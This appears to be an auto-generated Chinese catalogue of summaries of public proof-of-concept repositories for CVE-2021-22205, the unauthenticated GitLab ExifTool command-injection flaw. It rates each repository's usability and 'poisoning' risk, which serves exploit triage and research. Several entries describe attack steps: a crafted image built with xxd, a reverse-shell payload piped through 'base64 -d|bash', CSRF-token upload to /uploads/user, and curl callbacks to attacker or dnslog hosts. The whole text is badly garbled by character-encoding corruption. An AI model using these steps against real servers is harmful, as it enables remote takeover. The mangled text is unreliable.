1.  **æ¼æ´žè§¦å‘ï¼š** æ”»å‡»è€…éœ€è¦å‘å­˜åœ¨æ¼æ´žçš„ GitLab å®žä¾‹ä¸Šä¼ åŒ…å«æ¶æ„ Exif å…ƒæ•°æ®çš„å›¾åƒæ–‡ä»¶ã€‚
2.  **å‘½ä»¤æ³¨å…¥ï¼š** æ¶æ„å…ƒæ•°æ®è¢« ExifTool å¤„ç†æ—¶ï¼Œä¼šå¯¼è‡´å‘½ä»¤æ³¨å…¥ï¼Œä»Žè€Œæ‰§è¡Œæ”»å‡»è€…æŒ‡å®šçš„å‘½ä»¤ã€‚
3.  **æœªæŽˆæƒè®¿é—®ï¼š** æ­¤æ¼æ´žæ— éœ€èº«ä»½éªŒè¯å³å¯åˆ©ç”¨ï¼Œå¤§å¤§é™ä½Žäº†æ”»å‡»é—¨æ§›ã€‚
4.  **RCEï¼š** æˆåŠŸåˆ©ç”¨æ­¤æ¼æ´žåŽï¼Œæ”»å‡»è€…å¯ä»¥åœ¨ GitLab æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„å‘½ä»¤ï¼Œä»Žè€ŒæŽ§åˆ¶æœåŠ¡å™¨ã€‚

**é¡¹ç›®åœ°å€:** [w0x68y/Gitlab-CVE-2021-22205](https://github.com/w0x68y/Gitlab-CVE-2021-22205)

**æ¼æ´žè¯¦æƒ…:** [CVE-2021-22205](https://nvd.nist.gov/vuln/detail/CVE-2021-22205)

---



---

## POC #11

**æ¥æº**: [CVE-2021-22205-findneo_GitLab-preauth-RCE_CVE-2021-22205.md](../2021/CVE-2021-22205-findneo_GitLab-preauth-RCE_CVE-2021-22205.md)

## CVE-2021-22205 - GitLab ExifTool å‘½ä»¤æ³¨å…¥

**æ¼æ´žç¼–å·:** CVE-2021-22205

**æ¼æ´žç±»åž‹:** å‘½ä»¤æ³¨å…¥

**å½±å“åº”ç”¨:** GitLab

**å±å®³ç­‰çº§:** é«˜å±ï¼Œæœªç»èº«ä»½éªŒè¯çš„è¿œç¨‹å‘½ä»¤æ‰§è¡Œ

**å½±å“ç‰ˆæœ¬:** >=11.9, <13.8.8 || >=13.9, <13.9.6 || >=13.10, <13.10.3

**åˆ©ç”¨æ¡ä»¶:** ç›®æ ‡GitLabå®žä¾‹éœ€è¦å­˜åœ¨æ¼æ´žç‰ˆæœ¬ï¼Œå¹¶ä¸”å¯ä»¥é€šè¿‡ç½‘ç»œè®¿é—®ã€‚

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£Žé™©:** 0%

## è¯¦æƒ…

CVE-2021-22205æ˜¯ä¸€ä¸ªGitLab CE/EEä¸­çš„å‘½ä»¤æ³¨å…¥æ¼æ´žï¼Œå­˜åœ¨äºŽ11.9åˆ°13.10.3ä¹‹é—´çš„å¤šä¸ªç‰ˆæœ¬ä¸­ã€‚æ¼æ´žåŽŸå› æ˜¯GitLabåœ¨å¤„ç†å›¾åƒæ–‡ä»¶æ—¶ï¼Œæœªæ­£ç¡®éªŒè¯ä¼ é€’ç»™æ–‡ä»¶è§£æžå™¨çš„è¾“å…¥ï¼Œå¯¼è‡´æ”»å‡»è€…å¯ä»¥åˆ©ç”¨ç‰¹åˆ¶çš„å›¾åƒæ–‡ä»¶æ‰§è¡Œä»»æ„å‘½ä»¤ã€‚

**æ¼æ´žåˆ©ç”¨æ–¹å¼ï¼š**

1.  æ”»å‡»è€…æž„é€ ä¸€ä¸ªæ¶æ„çš„å›¾åƒæ–‡ä»¶ï¼Œè¯¥æ–‡ä»¶åŒ…å«åµŒå…¥çš„æ¶æ„å‘½ä»¤ã€‚POCä»£ç ä¸­ï¼Œä½¿ç”¨äº†`xxd`å‘½ä»¤å°†åå…­è¿›åˆ¶æ•°æ®è½¬æ¢æˆäºŒè¿›åˆ¶æ•°æ®ï¼Œå¹¶è¿½åŠ åˆ°åä¸º`1.jpg`çš„æ–‡ä»¶ä¸­ã€‚å…¶ä¸­ï¼Œè¿½åŠ çš„åå…­è¿›åˆ¶æ•°æ®ä¸­åŒ…å«äº†shellå‘½ä»¤ï¼Œæœ€ç»ˆå°†`xxx_base64_of_reverse_shell_code_xxx`è¿›è¡Œbase64è§£ç åŽæ‰§è¡Œã€‚
2.  æ”»å‡»è€…é€šè¿‡`curl`å‘½ä»¤ï¼Œæ¨¡æ‹Ÿæ–‡ä»¶ä¸Šä¼ è¯·æ±‚ï¼Œå°†æ¶æ„å›¾åƒæ–‡ä»¶ä¸Šä¼ åˆ°å­˜åœ¨æ¼æ´žçš„GitLabå®žä¾‹ã€‚POCä»£ç é€šè¿‡èŽ·å–ç”¨æˆ·çš„CSRF-Tokenï¼Œç„¶åŽåˆ©ç”¨/uploads/useræŽ¥å£ä¸Šä¼ ã€‚
3.  GitLabä½¿ç”¨ExifToolå¤„ç†ä¸Šä¼ çš„å›¾åƒæ–‡ä»¶æ—¶ï¼Œç”±äºŽå›¾åƒæ–‡ä»¶ä¸­çš„æ¶æ„å‘½ä»¤ï¼Œå¯¼è‡´ExifToolæ‰§è¡Œè¯¥å‘½ä»¤ï¼Œä»Žè€Œå®žçŽ°è¿œç¨‹å‘½ä»¤æ‰§è¡Œã€‚
4.  POCä¸­ä½¿ç”¨äº†`base64 -d|bash` çš„æ–¹å¼æ‰§è¡Œpayloadã€‚

**æŠ•æ¯’é£Žé™©åˆ†æžï¼š**

æä¾›çš„POCä»£ç ç›®çš„æ˜¯åˆ©ç”¨è¯¥æ¼æ´žå®žçŽ°è¿œç¨‹ä»£ç æ‰§è¡Œï¼Œè™½ç„¶æ‰§è¡Œäº†å¤–éƒ¨å‘½ä»¤ï¼Œä½†æ˜¯æ²¡æœ‰å‘çŽ°ä½œè€…åœ¨å…¶ä¸­éšè—å…¶ä»–æ¶æ„ä»£ç çš„è¡Œä¸ºã€‚ä»£ç æ¸…æ™°åœ°å±•ç¤ºäº†æ¼æ´žåˆ©ç”¨çš„è¿‡ç¨‹ï¼Œæ²¡æœ‰å‘çŽ°è¯•å›¾åœ¨ç›®æ ‡ç³»ç»Ÿä¸Šå®‰è£…åŽé—¨æˆ–è¿›è¡Œå…¶ä»–æ¶æ„æ“ä½œçš„è¿¹è±¡ã€‚è¯¥POCçš„ä¸»è¦ç›®çš„æ˜¯æ¼”ç¤ºæ¼æ´žåˆ©ç”¨ï¼Œè€Œéžè¿›è¡Œå®žé™…çš„æ¶æ„æ”»å‡»ã€‚

å› æ­¤ï¼ŒæŠ•æ¯’é£Žé™©è¯„ä¼°ä¸º 0%ã€‚

**é¡¹ç›®åœ°å€:** [findneo/GitLab-preauth-RCE_CVE-2021-22205](https://github.com/findneo/GitLab-preauth-RCE_CVE-2021-22205)

**æ¼æ´žè¯¦æƒ…:** [CVE-2021-22205](https://nvd.nist.gov/vuln/detail/CVE-2021-22205)

---

## POC #12

**æ¥æº**: [CVE-2021-22205-hh-hunter_cve-2021-22205.md](../2021/CVE-2021-22205-hh-hunter_cve-2021-22205.md)

## CVE-2021-22205-GitLab-è¿œç¨‹å‘½ä»¤æ‰§è¡Œ

**æ¼æ´žç¼–å·:** CVE-2021-22205

**æ¼æ´žç±»åž‹:** è¿œç¨‹å‘½ä»¤æ‰§è¡Œ

**å½±å“åº”ç”¨:** GitLab

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå¯èƒ½å¯¼è‡´æœåŠ¡å™¨å®Œå…¨æŽ§åˆ¶

**å½±å“ç‰ˆæœ¬:** >=11.9, <13.8.8; >=13.9, <13.9.6; >=13.10, <13.10.3

**åˆ©ç”¨æ¡ä»¶:** éœ€è¦ç½‘ç»œè®¿é—®GitLabå®žä¾‹ï¼Œç›®æ ‡å®žä¾‹ä½¿ç”¨å—å½±å“çš„ç‰ˆæœ¬ï¼Œå¹¶ä¸”å¯ä¸Šä¼ å›¾ç‰‡ï¼ˆæˆ–å…¶ä»–åˆ©ç”¨ExifToolè§£æžçš„æ–‡ä»¶ç±»åž‹ï¼‰ã€‚

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£Žé™©:** 0%

## è¯¦æƒ…

CVE-2021-22205æ˜¯GitLab CE/EEä¸­çš„ä¸€ä¸ªè¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´žã€‚è¯¥æ¼æ´žæºäºŽGitLabå¯¹ä¸Šä¼ çš„å›¾ç‰‡æ–‡ä»¶ï¼ˆæˆ–å…¶ä»–åˆ©ç”¨ExifToolè§£æžçš„æ–‡ä»¶ç±»åž‹ï¼‰çš„æ ¡éªŒä¸ä¸¥æ ¼ï¼Œå…è®¸æ”»å‡»è€…é€šè¿‡æž„é€ æ¶æ„çš„å›¾ç‰‡æ–‡ä»¶ï¼Œåˆ©ç”¨ExifToolæ‰§è¡Œä»»æ„å‘½ä»¤ã€‚

**æœ‰æ•ˆæ€§ï¼š**
æä¾›çš„docker-composeæ–‡ä»¶ä¸»è¦ç”¨äºŽæ­å»ºå­˜åœ¨æ¼æ´žå’Œä¸å­˜åœ¨æ¼æ´žçš„çŽ¯å¢ƒï¼Œç”¨äºŽéªŒè¯æ¼æ´žçš„ä¿®å¤æ•ˆæžœã€‚docker-compose-vulnerability.yml ä½¿ç”¨äº†13.9.5-ee.0ç‰ˆæœ¬ï¼Œåœ¨å—å½±å“çš„ç‰ˆæœ¬èŒƒå›´å†…ï¼Œå¯ä»¥éªŒè¯æ¼æ´žã€‚

**æŠ•æ¯’é£Žé™©ï¼š**
æä¾›çš„docker-composeæ–‡ä»¶ä»…ä»…ç”¨äºŽæž„å»ºçŽ¯å¢ƒï¼Œæ²¡æœ‰å‘çŽ°æ¶æ„ä»£ç ï¼ŒæŠ•æ¯’é£Žé™©ä¸º0%ã€‚

**åˆ©ç”¨æ–¹å¼ï¼š**
æ”»å‡»è€…é€šè¿‡ä¸Šä¼ ç‰¹åˆ¶çš„æ¶æ„å›¾ç‰‡æ–‡ä»¶ï¼ˆä¾‹å¦‚ï¼ŒåŒ…å«æ¶æ„å‘½ä»¤çš„Exifå…ƒæ•°æ®çš„å›¾ç‰‡æ–‡ä»¶ï¼‰åˆ°GitLabæœåŠ¡å™¨ã€‚GitLabä½¿ç”¨ExifToolè§£æžè¯¥å›¾ç‰‡æ–‡ä»¶æ—¶ï¼Œä¼šæ‰§è¡Œå›¾ç‰‡ä¸­åµŒå…¥çš„æ¶æ„å‘½ä»¤ï¼Œä»Žè€Œå¯¼è‡´è¿œç¨‹å‘½ä»¤æ‰§è¡Œã€‚å…·ä½“æ­¥éª¤å¦‚ä¸‹ï¼š

1.  æž„é€ åŒ…å«æ¶æ„å‘½ä»¤çš„å›¾ç‰‡æ–‡ä»¶ã€‚
2.  å°†è¯¥å›¾ç‰‡æ–‡ä»¶ä¸Šä¼ åˆ°GitLabæœåŠ¡å™¨ã€‚ä¾‹å¦‚ï¼Œå¯ä»¥é€šè¿‡å¤´åƒä¸Šä¼ ã€é¡¹ç›®logoä¸Šä¼ ç­‰åŠŸèƒ½ã€‚
3.  GitLabæœåŠ¡å™¨è°ƒç”¨ExifToolè§£æžè¯¥å›¾ç‰‡æ–‡ä»¶ï¼Œæ‰§è¡ŒåµŒå…¥çš„æ¶æ„å‘½ä»¤ã€‚
4.  æ”»å‡»è€…é€šè¿‡æ‰§è¡Œçš„å‘½ä»¤æŽ§åˆ¶æœåŠ¡å™¨ã€‚

**é¡¹ç›®åœ°å€:** [hh-hunter/cve-2021-22205](https://github.com/hh-hunter/cve-2021-22205)

**æ¼æ´žè¯¦æƒ…:** [CVE-2021-22205](https://nvd.nist.gov/vuln/detail/CVE-2021-22205)

---

## POC #13

**æ¥æº**: [CVE-2021-22205-hhhotdrink_CVE-2021-22205.md](../2021/CVE-2021-22205-hhhotdrink_CVE-2021-22205.md)

## CVE-2021-22205-GitLab-RCE

**æ¼æ´žç¼–å·:** CVE-2021-22205

**æ¼æ´žç±»åž‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ (RCE)

**å½±å“åº”ç”¨:** GitLab

**å±å®³ç­‰çº§:** é«˜å±ï¼Œæœªç»èº«ä»½éªŒè¯çš„è¿œç¨‹ä»£ç æ‰§è¡Œ

**å½±å“ç‰ˆæœ¬:** >=11.9, <13.8.8; >=13.9, <13.9.6; >=13.10, <13.10.3

**åˆ©ç”¨æ¡ä»¶:** ç›®æ ‡GitLabå®žä¾‹éœ€è¦ä½äºŽå—å½±å“çš„ç‰ˆæœ¬èŒƒå›´å†…ï¼Œå¹¶ä¸”å¯ä»¥é€šè¿‡ç½‘ç»œè®¿é—®ã€‚

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£Žé™©:** 10%

## è¯¦æƒ…

CVE-2021-22205 æ˜¯ä¸€ä¸ªå­˜åœ¨äºŽ GitLab CE/EE ä¸­çš„è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´žã€‚è¯¥æ¼æ´žæºäºŽ GitLab æ²¡æœ‰æ­£ç¡®éªŒè¯ä¼ é€’ç»™æ–‡ä»¶è§£æžå™¨çš„å›¾åƒæ–‡ä»¶ã€‚æ”»å‡»è€…å¯ä»¥é€šè¿‡ä¸Šä¼ ç‰¹åˆ¶çš„å›¾åƒæ–‡ä»¶ï¼ˆåˆ©ç”¨ ExifTool çš„å‘½ä»¤æ³¨å…¥æ¼æ´žï¼‰æ¥æ‰§è¡Œä»»æ„ä»£ç ã€‚

**æœ‰æ•ˆæ€§ï¼š**
æ ¹æ®æ¼æ´žåº“ä¿¡æ¯å’Œæä¾›çš„æ¼æ´žåˆ©ç”¨ä»£ç ï¼Œè¯¥æ¼æ´žæ˜¯æœ‰æ•ˆçš„ï¼Œå¹¶ä¸”å·²è¢«å…¬å¼€åˆ©ç”¨ã€‚CISA å·²å°†å…¶æ·»åŠ åˆ°å·²çŸ¥è¢«åˆ©ç”¨çš„æ¼æ´žç›®å½•ä¸­ã€‚

**æŠ•æ¯’é£Žé™©ï¼š**
æä¾›çš„ Python è„šæœ¬ `22205exp.py` åŒ…å«æ¼æ´žéªŒè¯å’Œåˆ©ç”¨ä»£ç ã€‚ è¯¥è„šæœ¬åˆ©ç”¨ `dnslog.cn` æ¥éªŒè¯å‘½ä»¤æ‰§è¡Œã€‚ è™½ç„¶ `dnslog.cn` æ˜¯ä¸€ç§å¸¸è§çš„æ¼æ´žéªŒè¯æ–¹æ³•ï¼Œä½†å¦‚æžœæ”»å‡»è€…æŽ§åˆ¶ `dnslog.cn`ï¼Œåˆ™å­˜åœ¨ä¸€å®šçš„æŠ•æ¯’é£Žé™©ï¼Œä»–ä»¬å¯ä»¥è®°å½•æ¼æ´žåˆ©ç”¨ä¿¡æ¯ã€‚ åŒæ—¶ï¼Œè„šæœ¬ä¸­ä½¿ç”¨äº†ç¡¬ç¼–ç çš„User-Agentå’ŒContent-Typeï¼Œè¿™å¢žåŠ äº†è„šæœ¬è¢«è¯†åˆ«å’Œé˜²å¾¡çš„å¯èƒ½æ€§ã€‚å¦‚æžœæ”»å‡»è€…ä¿®æ”¹è¿™äº›å‚æ•°ï¼Œå¯èƒ½ä¼šå¢žåŠ æ”»å‡»çš„æˆåŠŸçŽ‡ï¼Œä½†ä¹Ÿå¯èƒ½è¢«è§†ä¸ºæ½œåœ¨çš„æ¶æ„è¡Œä¸ºã€‚ æ­¤å¤–ï¼Œè¯¥è„šæœ¬ä¾èµ–äºŽ `beautifulsoup4` å’Œ `requests` åº“ã€‚ å¦‚æžœè¿™äº›åº“è¢«æ¶æ„ç¯¡æ”¹ï¼Œå¯èƒ½ä¼šå¯¼è‡´æŠ•æ¯’ã€‚ ç»¼åˆæ¥çœ‹ï¼Œè„šæœ¬æœ¬èº«åŒ…å«ç›´æŽ¥çš„åŽé—¨ä»£ç çš„å¯èƒ½æ€§è¾ƒä½Žï¼Œä½†é—´æŽ¥æŠ•æ¯’é£Žé™©ï¼ˆå¦‚ä¾èµ–åº“æˆ–éªŒè¯å¹³å°è¢«æŽ§åˆ¶ï¼‰ä»ç„¶å­˜åœ¨ï¼Œå› æ­¤æŠ•æ¯’é£Žé™©å¤§çº¦ä¸º10%ã€‚

**åˆ©ç”¨æ–¹å¼ï¼š**
1.  **èŽ·å– CSRF Tokenï¼š** è„šæœ¬é¦–å…ˆè®¿é—® `/users/sign_in` é¡µé¢ï¼Œä½¿ç”¨ `BeautifulSoup` è§£æž HTMLï¼Œæå– CSRF tokenã€‚
2.  **æž„é€ æ¶æ„å›¾åƒæ–‡ä»¶ï¼š** è„šæœ¬æž„é€ ä¸€ä¸ªåŒ…å«æ¶æ„ ExifTool å‘½ä»¤çš„ DJVU æ ¼å¼å›¾åƒæ–‡ä»¶ã€‚è¯¥å‘½ä»¤é€šå¸¸ç”¨äºŽæ‰§è¡Œä»»æ„ç³»ç»Ÿå‘½ä»¤ï¼Œä¾‹å¦‚é€šè¿‡ `curl` å°†æœåŠ¡å™¨ä¿¡æ¯å‘é€åˆ°æ”»å‡»è€…çš„ DNS æœåŠ¡å™¨ã€‚
3.  **ä¸Šä¼ æ¶æ„å›¾åƒæ–‡ä»¶ï¼š** è„šæœ¬ä½¿ç”¨åŒ…å«æ¶æ„å›¾åƒæ–‡ä»¶å’Œ CSRF token çš„ `multipart/form-data` è¯·æ±‚ï¼Œå°†æ–‡ä»¶ä¸Šä¼ åˆ° `/uploads/user` ç«¯ç‚¹ã€‚
4.  **è§¦å‘å‘½ä»¤æ‰§è¡Œï¼š** GitLab å°è¯•ä½¿ç”¨ ExifTool å¤„ç†è¯¥å›¾åƒï¼Œç”±äºŽæ–‡ä»¶å†…å®¹æ²¡æœ‰ç»è¿‡å……åˆ†éªŒè¯ï¼Œå¯¼è‡´ ExifTool æ‰§è¡ŒåµŒå…¥åœ¨å›¾åƒæ–‡ä»¶ä¸­çš„æ¶æ„å‘½ä»¤ã€‚
5.  **éªŒè¯æ¼æ´žï¼š** è„šæœ¬é€šè¿‡æŸ¥è¯¢ `dnslog.cn` æ¥ç¡®è®¤å‘½ä»¤æ˜¯å¦æˆåŠŸæ‰§è¡Œã€‚

æ€»çš„æ¥è¯´ï¼Œè¯¥æ¼æ´žåˆ©ç”¨çš„æœ‰æ•ˆæ€§è¾ƒé«˜ï¼Œä½†éœ€è¦æ³¨æ„æ½œåœ¨çš„æŠ•æ¯’é£Žé™©ã€‚åˆ©ç”¨æ–¹å¼ç›¸å¯¹ç®€å•ï¼Œå¯ä»¥é€šè¿‡ä¸Šä¼ ç‰¹åˆ¶çš„å›¾åƒæ–‡ä»¶æ¥å®žçŽ°è¿œç¨‹ä»£ç æ‰§è¡Œã€‚

**é¡¹ç›®åœ°å€:** [hhhotdrink/CVE-2021-22205](https://github.com/hhhotdrink/CVE-2021-22205)

**æ¼æ´žè¯¦æƒ…:** [CVE-2021-22205](https://nvd.nist.gov/vuln/detail/CVE-2021-22205)

---

## POC #14

**æ¥æº**: [CVE-2021-22205-honypot_CVE-2021-22205.md](../2021/CVE-2021-22205-honypot_CVE-2021-22205.md)

## CVE-2021-22205-GitLab-RCE

**æ¼æ´žç¼–å·:** CVE-2021-22205

**æ¼æ´žç±»åž‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ(RCE)

**å½±å“åº”ç”¨:** GitLab

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå¯å¯¼è‡´å®Œå…¨æŽ§åˆ¶å—å½±å“çš„GitLabå®žä¾‹

**å½±å“ç‰ˆæœ¬:** >=11.9, <13.8.8; >=13.9, <13.9.6; >=13.10, <13.10.3

**åˆ©ç”¨æ¡ä»¶:** æœªç»èº«ä»½éªŒè¯çš„ç½‘ç»œè®¿é—®ï¼Œä»¥åŠç›®æ ‡GitLabå®žä¾‹å­˜åœ¨æ¼æ´žã€‚

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£Žé™©:** 20%

## è¯¦æƒ…

CVE-2021-22205æ˜¯GitLab CE/EEä¸­çš„ä¸€ä¸ªè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´žã€‚ç”±äºŽGitLabæ²¡æœ‰æ­£ç¡®éªŒè¯ä¼ é€’ç»™æ–‡ä»¶è§£æžå™¨çš„å›¾åƒæ–‡ä»¶ï¼Œå¯¼è‡´äº†å‘½ä»¤æ³¨å…¥ã€‚æ”»å‡»è€…å¯ä»¥ä¸Šä¼ ç‰¹åˆ¶çš„å›¾åƒæ–‡ä»¶ï¼Œåˆ©ç”¨ExifToolçš„æ¼æ´žæ‰§è¡Œä»»æ„ä»£ç ã€‚

**æœ‰æ•ˆæ€§ï¼š**
æä¾›çš„POCä»£ç åˆ©ç”¨Docker Composeéƒ¨ç½²äº†ä¸€ä¸ªåŒ…å«æ¼æ´žçš„GitLab EE 13.9.5å®žä¾‹ï¼Œè¡¨æ˜Žè¯¥POCæ˜¯æœ‰æ•ˆçš„ï¼Œå¯ä»¥å¤çŽ°è¯¥æ¼æ´žã€‚

**æŠ•æ¯’é£Žé™©ï¼š**
å°½ç®¡å¤§éƒ¨åˆ†ä»£ç çœ‹èµ·æ¥æ˜¯ä¸ºäº†å¤çŽ°æ¼æ´žï¼Œä½†ä»ç„¶å­˜åœ¨ä¸€äº›æ½œåœ¨çš„æŠ•æ¯’é£Žé™©ã€‚
*   `gitlab/entry.sh`è„šæœ¬æ·»åŠ äº†ä¸€ä¸ªåä¸º`eth1`çš„è™šæ‹Ÿç½‘ç»œæŽ¥å£ï¼Œå¹¶åˆ†é…äº†ä¸€ä¸ªå…¬ç½‘IPåœ°å€ã€‚è¿™æœ¬èº«å¹¶æ²¡æœ‰æ¶æ„ï¼Œä½†å¦‚æžœæ”»å‡»è€…æŽ§åˆ¶äº†GitLabå®žä¾‹ï¼Œåˆ™å¯èƒ½åˆ©ç”¨æ­¤æŽ¥å£è¿›è¡Œéšè”½é€šä¿¡æˆ–æ•°æ®æ³„éœ²ã€‚å¯èƒ½æ€§ä¸º10%ã€‚
* `gitlab/dummy/backup.txt`åŒ…å«äº†ä¸€ä¸ªé»˜è®¤çš„ç”¨æˆ·åå¯†ç ,å¦‚æžœè¢«åˆ©ç”¨,å­˜åœ¨å®‰å…¨é£Žé™©ã€‚å¯èƒ½æ€§ä¸º10%.

æ€»ä½“çš„æŠ•æ¯’é£Žé™©è¯„ä¼°ä¸º20%ã€‚

**åˆ©ç”¨æ–¹å¼ï¼š**
1.  æ”»å‡»è€…éœ€è¦æž„å»ºä¸€ä¸ªæ¶æ„å›¾åƒæ–‡ä»¶ï¼Œå…¶ä¸­åŒ…å«åµŒå…¥çš„ExifToolå‘½ä»¤æ³¨å…¥Payloadã€‚
2.  æ”»å‡»è€…å°†æ¶æ„å›¾åƒä¸Šä¼ åˆ°æ˜“å—æ”»å‡»çš„GitLabå®žä¾‹ï¼ˆä¾‹å¦‚ï¼Œé€šè¿‡å¤´åƒä¸Šä¼ ã€é¡¹ç›®é™„ä»¶ç­‰ï¼‰ã€‚
3.  GitLabå°è¯•å¤„ç†å›¾åƒï¼Œè°ƒç”¨ExifToolã€‚
4.  ExifToolæ‰§è¡Œæ³¨å…¥çš„å‘½ä»¤ï¼Œä»Žè€Œå¯¼è‡´è¿œç¨‹ä»£ç æ‰§è¡Œã€‚

**é¡¹ç›®åœ°å€:** [honypot/CVE-2021-22205](https://github.com/honypot/CVE-2021-22205)

**æ¼æ´žè¯¦æƒ…:** [CVE-2021-22205](https://nvd.nist.gov/vuln/detail/CVE-2021-22205)

---

## POC #15

**æ¥æº**: [CVE-2021-22205-inspiringz_CVE-2021-22205.md](../2021/CVE-2021-22205-inspiringz_CVE-2021-22205.md)

## CVE-2021-22205-GitLab-RCE

**æ¼æ´žç¼–å·:** CVE-2021-22205

**æ¼æ´žç±»åž‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ

**å½±å“åº”ç”¨:** GitLab

**å±å®³ç­‰çº§:** é«˜å±ï¼ŒæœªæŽˆæƒè¿œç¨‹ä»£ç æ‰§è¡Œ

**å½±å“ç‰ˆæœ¬:** >=11.9, <13.8.8; >=13.9, <13.9.6; >=13.10, <13.10.3

**åˆ©ç”¨æ¡ä»¶:** ç›®æ ‡GitLabå®žä¾‹å­˜åœ¨æ¼æ´žï¼Œå¯ç½‘ç»œè®¿é—®

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£Žé™©:** 10%

## è¯¦æƒ…

CVE-2021-22205æ˜¯GitLab CE/EEä¸­çš„ä¸€ä¸ªè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´žã€‚è¯¥æ¼æ´žæºäºŽGitLabæœªèƒ½æ­£ç¡®éªŒè¯ä¼ é€’ç»™æ–‡ä»¶è§£æžå™¨çš„å›¾åƒæ–‡ä»¶ï¼Œå¯¼è‡´è¿œç¨‹å‘½ä»¤æ‰§è¡Œã€‚æ”»å‡»è€…å¯ä»¥é€šè¿‡ä¸Šä¼ åŒ…å«æ¶æ„ExifToolå…ƒæ•°æ®çš„å›¾åƒæ–‡ä»¶æ¥åˆ©ç”¨æ­¤æ¼æ´žã€‚

**æœ‰æ•ˆæ€§ï¼š**
æ ¹æ®æä¾›çš„æ¼æ´žä¿¡æ¯å’Œæ¼æ´žåˆ©ç”¨ä»£ç ï¼Œå¯ä»¥åˆ¤æ–­è¯¥POCä»£ç æ˜¯æœ‰æ•ˆçš„ã€‚æ¼æ´žåº“ä¿¡æ¯è¡¨æ˜Žè¯¥æ¼æ´žå½±å“å¤šä¸ªGitLabç‰ˆæœ¬ï¼Œä¸”CVSSè¯„åˆ†ä¸º10ï¼Œå±žäºŽä¸¥é‡çº§åˆ«ã€‚æ¼æ´žåˆ©ç”¨ä»£ç æ—¨åœ¨åˆ©ç”¨ExifToolåœ¨å¤„ç†æ¶æ„å›¾åƒæ—¶çš„å‘½ä»¤æ³¨å…¥æ¼æ´žã€‚

**æŠ•æ¯’é£Žé™©ï¼š**
æä¾›çš„æ¼æ´žåˆ©ç”¨ä»£ç çœ‹èµ·æ¥åƒæ˜¯åˆ©ç”¨CVE-2021-22205æ¼æ´žçš„exploitï¼Œç”¨äºŽè¿œç¨‹ä»£ç æ‰§è¡Œã€‚å…¶ä¸­å®šä¹‰äº†Sessionsç±»ä»¥æ–¹ä¾¿å‘é€HTTPè¯·æ±‚, å¹¶ä¸”ä½¿ç”¨äº†DNSLogï¼ŒPostBinï¼ŒRequestBinç­‰æœåŠ¡ä½œä¸ºéªŒè¯æ¼æ´žçš„æ–¹å¼ã€‚ä»£ç ä¸­`random_str`å‡½æ•°ç”¨äºŽç”Ÿæˆéšæœºå­—ç¬¦ä¸²ï¼Œè¿™åœ¨æ¼æ´žåˆ©ç”¨ä¸­å¾ˆå¸¸è§ï¼Œç”¨äºŽé¿å…è¢«ç®€å•è§„åˆ™æ£€æµ‹ã€‚`/tmp/5c52ea306e0854cb73063a671293313c/CVE-2021-22205.py`è¡¨æ˜Žè¯¥è„šæœ¬ä½äºŽä¸´æ—¶æ–‡ä»¶å¤¹ï¼Œå¯èƒ½è¡¨æ˜Žæ˜¯ä¸€ä¸ªæå–å‡ºæ¥çš„æˆ–è€…ä¸‹è½½çš„åˆ©ç”¨è„šæœ¬ã€‚ä»£ç ä¸­å­˜åœ¨å¯¹ä¸€äº›å¤–éƒ¨æœåŠ¡çš„è°ƒç”¨ï¼Œæ¯”å¦‚DNSLogï¼ŒRequestBinç­‰ï¼Œä½œè€…å¯èƒ½é€šè¿‡è¿™äº›æœåŠ¡æ¥æ”¶é›†ä¸€äº›ä¿¡æ¯ã€‚å› æ­¤ï¼Œå­˜åœ¨ä¸€å®šè¢«æŠ•æ¯’çš„é£Žé™©ï¼Œä¾‹å¦‚ä½œè€…åœ¨è„šæœ¬ä¸­åµŒå…¥æ¶æ„ä»£ç ï¼Œåˆ©ç”¨ç›®æ ‡æœåŠ¡å™¨çš„èµ„æºè¿›è¡ŒæŒ–çŸ¿æˆ–è€…å…¶ä»–æ¶æ„è¡Œä¸ºã€‚æ­¤å¤–ï¼ŒDNSLogå¦‚æžœè¢«æ¶æ„åŠ«æŒï¼Œå¯èƒ½å¯¼è‡´ä¿¡æ¯æ³„éœ²ã€‚ç»¼ä¸Šæ‰€è¿°ï¼Œå­˜åœ¨10%çš„æŠ•æ¯’å¯èƒ½æ€§ï¼Œè¯·ä»”ç»†å®¡è®¡ä»£ç ã€‚

**åˆ©ç”¨æ–¹å¼ï¼š**
1.  **èŽ·å–CSRF Tokenå’ŒSession Cookieï¼š** æ¼æ´žåˆ©ç”¨çš„ç¬¬ä¸€æ­¥æ˜¯èŽ·å–æœ‰æ•ˆçš„CSRF Tokenå’ŒSession Cookieã€‚POCä»£ç é¦–å…ˆå°è¯•è®¿é—® `/users/sign_in`ã€`/help` æˆ– `/explore` é¡µé¢ï¼Œç„¶åŽä»Žä¸­æå–æ‰€éœ€çš„tokenå’Œcookieã€‚
2.  **ä¸Šä¼ æ¶æ„å›¾åƒï¼š** åˆ©ç”¨èŽ·å–çš„CSRF Tokenå’ŒSession Cookieï¼Œæ”»å‡»è€…å¯ä»¥ä¸Šä¼ ä¸€ä¸ªç‰¹åˆ¶çš„å›¾åƒæ–‡ä»¶ã€‚è¯¥å›¾åƒæ–‡ä»¶çš„Exifå…ƒæ•°æ®ä¸­åŒ…å«æ¶æ„å‘½ä»¤ï¼Œè¿™äº›å‘½ä»¤å°†åœ¨GitLabæœåŠ¡å™¨ä¸Šç”±ExifToolæ‰§è¡Œã€‚
